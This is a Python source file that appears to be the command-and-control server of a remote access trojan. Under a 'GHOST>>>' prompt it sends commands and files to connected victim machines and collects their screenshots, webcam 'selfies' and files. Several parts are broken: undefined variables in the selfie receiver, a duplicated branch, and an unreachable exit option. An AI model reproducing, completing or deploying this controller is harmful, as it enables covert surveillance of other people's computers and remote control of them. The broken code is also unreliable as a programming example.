import socket
import threading
import os
import time



HOST = '0.0.0.0'
PORT = 5000

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

clients = []

print("Server waiting for connection...")

def receive_screenshot(conn, filename, filesize):

    with open(filename, "wb") as f:

        received = 0

        while received < filesize:

            chunk = conn.recv(min(1024, filesize - received))

            if not chunk:
                break

            f.write(chunk)

            received += len(chunk)

    print(f"[+] Screenshot saved as {filename}")



def receive_thread(conn, addr):
    while True:
        try:
            data = conn.recv(1024).decode()

            if not data:
                continue

            # SCREENSHOT HEADER detect
            if data.startswith("SCREEN "):

                parts = data.split()

                filename = parts[1]

                filesize = int(parts[2])

                print(f"\nReceiving screenshot: {filename}")

                receive_screenshot(conn, filename, filesize)

                continue

            # FILE HEADER detect
            if data.startswith("FILE "):

                parts = data.split()

                filename = parts[1]

                filesize = int(parts[2])

                receive_screenshot(conn, filename, filesize)

                continue

            print(f"\nClient [{addr[0]}]: {data}")

        except:
            print(f"\nClient {addr[0]} disconnected!\n")
            conn.close()

            if (conn, addr) in clients:
                clients.remove((conn, addr))

            break

def receive_selfie(conn, imgname, imgsize):

    with open(imgname, "wb") as f:

        received = 0

        while received < imgsize:

            chunk = conn.recv(min(1024, filesize - received))

            if not chunk:
                break

            f.write(chunk)

            received += len(chunk)

    print(f"[+] Selfie saved as {filename}")

def received_selfie(conn, addr):
    while True:
        try:
            data = conn.recv(1024).decode()

            if not data:
                continue

            # SCREENSHOT HEADER detect
            if data.startswith("SELFIE "):

                parts = data.split()

                imgname = parts[1]

                imgsize = int(parts[2])

                print(f"\nReceiving selfie: {imgname}")

                receive_selfie(conn, imgname, imgsize)

                continue

            # FILE HEADER detect
            if data.startswith("SELFIE "):

                parts = data.split()

                imgname = parts[1]

                imgsize = int(parts[2])

                receive_selfie(conn, imgname, imgsize)

                continue

            print(f"\nClient [{addr[0]}]: {data}")

        except:
            print(f"\nClient {addr[0]} disconnected!\n")
            conn.close()

            if (conn, addr) in clients:
                clients.remove((conn, addr))

            break
# 🔥 accept thread
def accept_clients():
    while True:
        conn, addr = server.accept()
        clients.append((conn, addr))
        print(f"\nConnected with {addr[0]}")


threading.Thread(target=accept_clients, daemon=True).start()


# 🔥 MAIN LOOP (ALWAYS SELECT)
while True:

    if len(clients) == 0:
        print("Waiting for client connection...")
        time.sleep(2)
        continue

    # 🔥 ALWAYS SHOW LIST
    print("\nConnected Clients:")
    for i, (c, a) in enumerate(clients, start=1):
        print(f"{i}. {a[0]}")

    print("0. All Clients")
    print("00 for terminate")

    try:
        choice = int(input("Select client: "))
    except:
        continue

    if choice == 0:
        selected = clients
    elif 1 <= choice <= len(clients):
        selected = [clients[choice - 1]]
    elif choice == 00:
        break
    else:
        continue

    # 🔥 start receive threads for selected (if not already running)
    for conn, addr in selected:
        threading.Thread(target=receive_thread, args=(conn, addr), daemon=True).start()

    # 🔥 SEND LOOP
    while True:
        msg = input("GHOST>>> ")

        if msg.lower() == "exit":
            break

        if msg.lower() == "back":
            print("Back to client list...\n")
            break

        if msg.lower() == "clear":
            os.system("cls")
            os.system("clear")
            continue
        
        


        
        if msg.startswith("upload "):
            try:
                filename = msg.replace("upload ", "").strip()

                if not os.path.exists(filename):
                    print("File not found!")
                    continue

                filesize = os.path.getsize(filename)

        
                for conn, addr in selected:
                    conn.send(f"FILE {filename} {filesize}".encode())

                time.sleep(1)

        
                with open(filename, "rb") as f:
                    while True:
                        chunk = f.read(1024)
                        if not chunk:
                            break
                        for conn, addr in selected:
                            conn.send(chunk)

                print("File sent successfully!")

            except Exception as e:
                print("Error sending file:", e)







        for conn, addr in selected:
            try:
                conn.send(msg.encode())
            except:
                print(f"Failed to send to {addr[0]}")